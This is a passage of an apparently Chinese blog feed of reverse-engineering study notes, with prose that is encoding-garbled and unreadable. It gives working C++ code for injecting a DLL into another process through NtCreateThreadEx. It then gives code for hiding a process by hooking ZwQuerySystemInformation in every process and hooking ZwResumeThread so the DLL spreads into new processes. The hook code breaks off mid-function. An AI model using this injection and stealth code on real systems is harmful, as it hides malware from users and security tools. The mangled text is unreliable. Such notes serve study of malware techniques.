class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,<span class="comment">//åˆ›å»ºçš„çº¿ç¨‹çš„çº¿ç¨‹å¥æŸ„</span></span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,<span class="comment">//çº¿ç¨‹æƒé™</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,<span class="comment">//å±æ€§ï¼Œä¸€èˆ¬nullptr</span></span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,<span class="comment">//ç›®æ ‡è¿›ç¨‹å¥æŸ„</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,<span class="comment">//èµ·å§‹å‡½æ•°</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,<span class="comment">//å‚æ•°</span></span></span></span><br><span class="line"><span class="params"><span class="function">ULONG CreateThreadFlags,<span class="comment">//å¥½åƒå’ŒæŒ‚èµ·æœ‰å…³ï¼Œå¡«FALSEå³å¯</span></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T ZeroBits,<span class="comment">//0å³å¯</span></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T StackSize,<span class="comment">//0å³å¯</span></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T MaximumStackSize,<span class="comment">//0å³å¯</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown<span class="comment">//nullptrå³å¯</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨è¿™ä¸ªæ³¨å…¥å°±å¥½</p><p>æ³¨å…¥å™¨ä»£ç </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">modifiedCreateRemoteThread</span><span class="params">(HANDLE hProcess, LPTHREAD_START_ROUTINE pThreadProc, LPVOID pRemoteBuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FARPROC pNtCreateThreadEx = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtCreateThreadEx&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pNtCreateThreadEx)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NtCreateThreadEx not found&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* PFNTCREATETHREADEX)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line">PFNTCREATETHREADEX crt = <span class="built_in">reinterpret_cast</span>&lt;PFNTCREATETHREADEX&gt;(pNtCreateThreadEx);</span><br><span class="line">HANDLE hThread;</span><br><span class="line"><span class="built_in">crt</span>(&amp;hThread, THREAD_ALL_ACCESS, <span class="literal">nullptr</span>, hProcess, pThreadProc, pRemoteBuf, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create thread failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);<span class="comment">//ç­‰å¾…çº¿ç¨‹ç»“æŸ</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> status = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))<span class="comment">//å–å¾—å¯¹åº”PIDå¥æŸ„</span></span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;open %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<span class="comment">//ç”³è¯·å†…å­˜</span></span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="number">0</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;memory alloc failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);<span class="comment">//å†™å…¥åœ°å€</span></span><br><span class="line">HMODULE kernel = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (kernel == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(kernel, <span class="string">&quot;LoadLibraryW&quot;</span>);<span class="comment">//è·å–LodaLibraryåœ°å€</span></span><br><span class="line">status = <span class="built_in">modifiedCreateRemoteThread</span>(hProcess,</span><br><span class="line">pThreadProc,<span class="comment">//çº¿ç¨‹å›è°ƒå‡½æ•°</span></span><br><span class="line">pBuf<span class="comment">//ä¼ å‚</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[]) &#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;USAGE: %s pid dll_path\n&quot;</span>), argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">inject</span>((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]))</span><br><span class="line">_tprintf(_T(<span class="string">&quot;inject %s success!\n&quot;</span>), argv[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;inject %s failed! \n&quot;</span>), argv[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/02/27/ExOAXnoB3Lyhp2d.png" alt="image-20250227181313876"></p><p>å¯ä»¥çœ‹åˆ°è¿›ç¨‹æŸ¥çœ‹å™¨ä¸­æ˜¾ç¤ºå·²ç»æ³¨å…¥æˆåŠŸ</p>]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç† </category>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> DLLæ³¨å…¥ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†æ ¸ã€‹0B-è¿›ç¨‹éšè—</title>
      <link href="/posts/88758528.html"/>
      <url>/posts/88758528.html</url>
      
        <content type="html"><![CDATA[<h2 id="åŸç†">åŸç†</h2><p>æ¯ä¸ªè¿›ç¨‹å¯ä»¥é€šè¿‡ZwQuerySystemInformation APIå‡½æ•°è·å–è¿è¡Œä¸­æ‰€æœ‰æœ‰å…³è¿›ç¨‹çš„ç»“æ„ä½“é“¾è¡¨ï¼Œ<br>é€šè¿‡Hookå…¶å®ƒæ‰€æœ‰è¿›ç¨‹çš„ZwQuerySystemInformation APIï¼Œä½¿å…¶åœ¨è¿”å›å‰å…ˆåˆ æ‰æƒ³è¦éšè—è¿›ç¨‹çš„ç»“æ„ä½“ï¼Œä»è€Œå®ç°éšè—è¿›ç¨‹</p><p>ä½†æ˜¯å¦‚æœåªæœ‰è¿™æ ·ï¼Œé‚£ä¹ˆååˆ›å»ºçš„è¿›ç¨‹ä¾ç„¶èƒ½è¯†åˆ«åˆ°ï¼Œæ‰€ä»¥é™¤äº†ç›´æ¥hook ZwQuerySystemInformation ï¼Œè¿˜è¦hookåˆ›å»ºè¿›ç¨‹çš„å‡½æ•°ï¼Œè¿™é‡Œé€‰æ‹©çš„æ˜¯ZwResumeThread apiï¼Œé€šè¿‡hookè¿™ä¸ªapiï¼Œä»»ä½•ä¸€ä¸ªè¿›ç¨‹åœ¨æ‰§è¡Œå®ƒæ—¶å…ˆæ‰§è¡Œhookæ–°è¿›ç¨‹çš„ZwQuerySystemInformation å®ç°æ–°è¿›ç¨‹ä¹Ÿè¢«hookçš„æ•ˆæœã€‚</p><h2 id="å…·ä½“æµç¨‹">å…·ä½“æµç¨‹</h2><p>å†™ä¸€ä¸ªdllï¼Œæ•ˆæœæ˜¯</p><ul><li>hookæœ¬è¿›ç¨‹çš„ZwQuerySystemInformationå‡½æ•°ï¼Œéšè—ç»“æ„ä½“</li><li>hookæœ¬è¿›ç¨‹çš„ZwResumeThreadå‡½æ•°ï¼Œæ³¨å…¥è¿™ä¸ªDLL</li></ul><p>å†™ä¸€ä¸ªå…¨è¿›ç¨‹æ³¨å…¥å™¨ï¼ŒæŠŠè¿™ä¸ªdllæ³¨å…¥æ‰€æœ‰è¿›ç¨‹</p><p>éšè—ç»“æ„ä½“çš„æ–¹å¼æ˜¯</p><p>NtQuerySystemInformationå‡½æ•°åœ¨SystemInformationClasså‚æ•°ä¸º5æ—¶ä¼šåœ¨SystemInformationè¿”å›PSYSTEM_PROCESS_INFORMATIONå‹ç»“æ„ä½“é“¾è¡¨å¤´ï¼Œæ¯ä¸ªç»“æ„ä½“éƒ½ä¿å­˜äº†ä¸€ä¸ªå½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    ULONG NumberOfThreads;</span><br><span class="line">    BYTE Reserved1[<span class="number">48</span>];</span><br><span class="line">    UNICODE_STRING ImageName;</span><br><span class="line">    KPRIORITY BasePriority;</span><br><span class="line">    HANDLE UniqueProcessId;</span><br><span class="line">    PVOID Reserved2;</span><br><span class="line">    ULONG HandleCount;</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    SIZE_T PeakVirtualSize;</span><br><span class="line">    SIZE_T VirtualSize;</span><br><span class="line">    ULONG Reserved4;</span><br><span class="line">    SIZE_T PeakWorkingSetSize;</span><br><span class="line">    SIZE_T WorkingSetSize;</span><br><span class="line">    PVOID Reserved5;</span><br><span class="line">    SIZE_T QuotaPagedPoolUsage;</span><br><span class="line">    PVOID Reserved6;</span><br><span class="line">    SIZE_T QuotaNonPagedPoolUsage;</span><br><span class="line">    SIZE_T PagefileUsage;</span><br><span class="line">    SIZE_T PeakPagefileUsage;</span><br><span class="line">    SIZE_T PrivatePageCount;</span><br><span class="line">    LARGE_INTEGER Reserved7[<span class="number">6</span>];</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ImageName.bufferä¸ºwchar_tç±»å‹çš„è¿›ç¨‹åï¼ŒNextEntryOffsetä¸ºå’Œä¸‹ä¸€ä¸ªç»“æ„ä½“èŠ‚ç‚¹ç›¸å·®çš„å­—èŠ‚æ•°ï¼Œé€šè¿‡è¿™ä¸ªæ¥è¿æ¥ï¼Œå¦‚æœä¸º0è¯´æ˜æ²¡æœ‰åç»§èŠ‚ç‚¹ï¼Œåªè¦é€šè¿‡è¿™ä¸ªæŠŠæƒ³è¦éšè—çš„éšè—æ‰å³å¯</p><p>ç¬¬äºŒç‚¹ï¼Œå‹¾å–ZwResumeThreadæ—¶ï¼Œåº”è¯¥å…ˆæ³¨å…¥åæ¢å¤ï¼ŒåŒæ—¶æ³¨æ„æ³¨å…¥æ—¶å¹¶ä¸æ˜¯åœ¨æ–°çº¿ç¨‹å†…éƒ¨æ³¨å…¥ï¼Œè€Œæ˜¯ä½œä¸ºçˆ¶è¿›ç¨‹è¿œç¨‹çº¿ç¨‹æ³¨å…¥</p><h2 id="å®ç°">å®ç°</h2><p>dllä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/SECTION:.SHARED,RWS&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.SHARE&quot;</span>)</span></span><br><span class="line">TCHAR g_szProcName[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">setProcName</span><span class="params">(LPCTSTR szProcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_tcscpy_s(g_szProcName, szProcName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//PZwQuerySystemInformation</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A70  mov         r10, rcx</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A73  mov         eax, 36h</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A78  test        byte ptr[7FFE0308h], 1</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A80  jne         00007FFBF7E50A85</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A82  syscall</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A84  ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BYTE orgBytesA[<span class="number">14</span>];</span><br><span class="line">BYTE orgBytesB[<span class="number">14</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwQuerySystemInformation)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwResumeThread)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE threadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG SuspendCount</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_THREAD_BASIC_INFORMATION</span> &#123;</span><br><span class="line">NTSTATUS ExitStatus;</span><br><span class="line">PVOID TebBaseAddress;</span><br><span class="line">CLIENT_ID ClientId;</span><br><span class="line">KAFFINITY AffinityMask;</span><br><span class="line">KPRIORITY Priority;</span><br><span class="line">KPRIORITY BasePriority;</span><br><span class="line">&#125; THREAD_BASIC_INFORMATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">FARPROC <span class="title">getProc</span><span class="params">(std::string moduleName, std::string processName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(moduleName.<span class="built_in">c_str</span>()), processName.<span class="built_in">c_str</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hookByCode</span><span class="params">(std::string moduleName, std::string processName, PROC pFuncNew, PBYTE orgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE jmpcode[<span class="number">14</span>] = &#123; <span class="number">0xff</span>,<span class="number">0x25</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line">FARPROC orgFunc = <span class="built_in">getProc</span>(moduleName, processName);</span><br><span class="line">PBYTE pOrgFunc = <span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(orgFunc);</span><br><span class="line"><span class="keyword">if</span> (pOrgFunc[<span class="number">0</span>] == <span class="number">0xff</span> &amp;&amp; pOrgFunc[<span class="number">1</span>] == <span class="number">0x25</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¿å­˜åŸå§‹ä»£ç </span></span><br><span class="line"><span class="built_in">memcpy</span>(orgBytes, pOrgFunc, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//8BYTEè·³è½¬ä¸ºç»å¯¹åœ°å€</span></span><br><span class="line">DWORD64 targetAddr = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(pFuncNew);</span><br><span class="line"></span><br><span 